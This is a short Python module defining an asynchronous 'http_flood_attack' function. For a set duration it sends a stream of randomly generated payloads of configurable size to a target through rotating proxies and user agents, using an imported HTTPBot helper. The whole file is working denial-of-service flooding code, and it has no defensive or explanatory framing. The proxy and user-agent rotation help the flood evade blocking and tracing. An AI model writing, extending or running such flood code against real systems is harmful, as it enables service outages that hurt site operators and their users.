import asyncio
import aiohttp 
from utils.http_bot import HTTPBot
from utils.random_utils import random_string

async def http_flood_attack(target, proxies, user_agents, duration, packet_size, packet_delay):
    bot = HTTPBot(proxies, user_agents)
    end_time = asyncio.get_event_loop().time() + duration

    async with aiohttp.ClientSession() as session:
        while asyncio.get_event_loop().time() < end_time:
            payload = random_string(packet_size * 1024)
            await bot.send_request(session, target, payload)
            await asyncio.sleep(packet_delay / 1000)
